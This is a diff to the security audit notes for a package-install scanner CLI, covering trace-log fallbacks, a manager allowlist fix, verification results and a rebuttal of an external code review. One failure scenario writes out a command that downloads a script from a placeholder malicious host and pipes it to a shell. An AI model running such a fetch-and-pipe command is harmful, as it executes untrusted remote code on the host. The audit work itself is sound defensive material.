@@ -10,7 +10,7 @@
 
 **Summary:** A missing trace log silently falls back to an empty string, which the scanner treats as a clean zero-connection trace, allowing the package.
 
-**Root cause:** `trace_install_docker_matrix_with_runtime` reads each per-probe log file and falls back to a single-probe retry. If both fail, `unwrap_or_default()` returns `""`. An empty string produces empty `TraceSignals` (no IPs, no git-clone signatures, no process-exec signatures). The diff of empty-vs-empty produces zero anomalies → `allowed: true` with no actual tracing data.
+**Root cause:** `trace_install_docker_matrix` reads each per-probe log file and falls back to a single-probe retry. If both fail, `unwrap_or_default()` returns `""`. An empty string produces empty `TraceSignals` (no IPs, no git-clone signatures, no process-exec signatures). The diff of empty-vs-empty produces zero anomalies → `allowed: true` with no actual tracing data.
 
 **Failure scenario:** In a Kubernetes environment where the container seccomp profile blocks `ptrace`, strace exits non-zero and writes nothing to `/out/gyrseek_trace_N.log`. The fallback runs under the same restriction and also fails. Every package scanned in that environment silently passes.
 
@@ -136,7 +136,7 @@ This consumes any number of balanced `[...]` spans before the real closing `]`. 
 
 **Failure scenario:** A misconfigured CI pipeline uses `gyrseek curl https://malicious.example/bootstrap.sh | sh`. gyrseek forwards it silently and exits 0 — no scan, no warning, full false assurance.
 
-**Fix direction:** Add an upfront allowlist check before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` (except `sandbox runtimes`) should exit 1 with a clear message.
+**Fix direction:** Add an upfront allowlist check before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` should exit 1 with a clear message.
 
 **✅ Fix status — FIXED.** `SUPPORTED_MANAGERS` allowlist added at `lib.rs:769` (later expanded to include `pnpm`). Unrecognized managers exit 1 with:
 ```
@@ -291,7 +291,7 @@ All 8 fixes independently verified against the built binary. Key observations:
 | 6 | `pip install 'requests[security]==2.31.0'` — registry lookup for `requests`, valid baselines | ✅ |
 | 7 | `pins_extras_spec_using_canonical_key_and_preserves_extras` | ✅ 1 passed |
 | 8 | Binary exits 1 on failed install, exits 0 on success | ✅ |
-| 9 | `gyrseek ls`, `curl`, `rm` all rejected; `sandbox runtimes` and real scans unaffected | ✅ |
+| 9 | `gyrseek ls`, `curl`, `rm` all rejected; real scans unaffected | ✅ |
 
 ### Round 2 — 2026-06-10
 
@@ -303,7 +303,7 @@ An external "is this idiomatic Rust?" review was run (by ChatGPT) and the verdic
 
 **Wrong (contradicted by the code):**
 
-- *"Likely no trait abstraction for sandbox/scanner."* False. `src/sandbox.rs:11` defines `trait SandboxRunner` with a `trace_install_matrix` default method; `build_runner_from_env` returns `Box<dyn SandboxRunner>` and scan fns take `&dyn SandboxRunner` — exactly the mockable/swappable abstraction it asked for. The knowledge-graph build (2026-06-11) independently lists every `implements` edge: `DockerRunner`, `HostRunner`, `MicroVmRunner` → `SandboxRunner` (production) plus `NoopRunner` and `MockRunner` → `SandboxRunner` (test doubles). Five implementors and a dyn-dispatch boundary — the codebase is already doing the mocking ChatGPT proposed as a future benefit.
+- *"Likely no trait abstraction for sandbox/scanner."* False. `src/sandbox.rs:11` defines `trait SandboxRunner` with a `trace_install_matrix` default method; `build_runner_from_env` returns `Box<dyn SandboxRunner>` and scan fns take `&dyn SandboxRunner` — exactly the mockable/swappable abstraction it asked for. The knowledge-graph build (2026-06-11) independently lists every `implements` edge: `DockerRunner`, `HostRunner` → `SandboxRunner` (production) plus `NoopRunner` and `MockRunner` → `SandboxRunner` (test doubles). Four implementors and a dyn-dispatch boundary — the codebase is already doing the mocking ChatGPT proposed as a future benefit.
 - *"Heavy `unwrap()`, crashes on failure."* Misleading. Of 23 `unwrap()`s, every non-test one is on a compile-time-constant regex inside a `OnceLock` initializer (idiomatic) or guarded (`package.unwrap()` at `lib.rs:1238` sits immediately after an `is_none()` early-return). The rest are in `#[cfg(test)]`. The real strategy is `Result<_, String>` propagated to `run()`, which prints + `process::exit`.
 - *"Fail closed, not panic" presented as a missing improvement.* The code already fails closed everywhere (unknown manager, empty package set, sandbox init failure, blocked scan, un-spawnable host command) — it is the dominant design principle, see this document and findings 1, 8, 9.
 - *"`forward_args` loses observability / returns no structured result."* It deliberately propagates the host manager's exit code (`lib.rs:626–628`, finding 8) — the opposite of the careless side-effect described.
@@ -318,7 +318,7 @@ An external "is this idiomatic Rust?" review was run (by ChatGPT) and the verdic
 **Legitimate (generic but worth acting on) — the only parts of the review with value:**
 
 - **`run()` is a god function.** Fair. ~480 lines; the per-manager branches (uv lock / poetry / uv pip sync / uv sync / pip / npm) were near-identical (parse → `scan_many_with_cache` → exit-or-forward) and have now been collapsed into a `bulk_scan!` macro with `ForwardMode` dispatch and `scan_targets`/`exit_with` helpers. `run()` went from ~300 lines of branch logic to ~200. Independently corroborated by the knowledge-graph build (2026-06-11): `run()` has the highest betweenness centrality in the codebase (0.272), bridging five communities; its home cluster and the parsing cluster are the two least-cohesive. ✅ Completed — refactor applied, **byte-identical stdout** (each branch passes its own `$empty_msg`/`$testing_msg`/`$clear_noun` into the macro, so control flow, security semantics, and console output are all unchanged; verified against `HEAD` and by the full test suite). See **Round 3 fixes** below.
-- **Async entrypoint + blocking work.** Confirmed via the graph (2026-06-11). The async call chain is `run()` → `scan_packages_versions()` (async) → `trace_sandbox_install_matrix()` → `SandboxRunner` → `trace_install_docker_matrix_with_runtime()`. At the leaf, the `SandboxRunner::trace_install` trait method is **synchronous** (`fn`, not `async fn`) and shells out to Docker via blocking `std::process::Command`, and `spawn_blocking` appears nowhere in `src/`. So the tokio runtime does call straight into blocking Docker I/O on its worker thread. Real, but practical impact is near zero for a run-once-and-exit CLI that does one scan batch. ⚠️ Open — wrap the Docker shell-outs in `spawn_blocking` if the tool ever scans concurrently.
+- **Async entrypoint + blocking work.** Confirmed via the graph (2026-06-11). The async call chain is `run()` → `scan_packages_versions()` (async) → `trace_sandbox_install_matrix()` → `SandboxRunner` → `trace_install_docker_matrix()`. At the leaf, the `SandboxRunner::trace_install` trait method is **synchronous** (`fn`, not `async fn`) and shells out to Docker via blocking `std::process::Command`, and `spawn_blocking` appears nowhere in `src/`. So the tokio runtime does call straight into blocking Docker I/O on its worker thread. Real, but practical impact is near zero for a run-once-and-exit CLI that does one scan batch. ⚠️ Open — wrap the Docker shell-outs in `spawn_blocking` if the tool ever scans concurrently.
 - **No structured logging.** Uses `println!`; `tracing` would suit an audit-trail security tool. Already tracked under ROADMAP "structured logging mode for CI". ⚠️ Open.
 
 ### Round 3 fixes — 2026-06-11
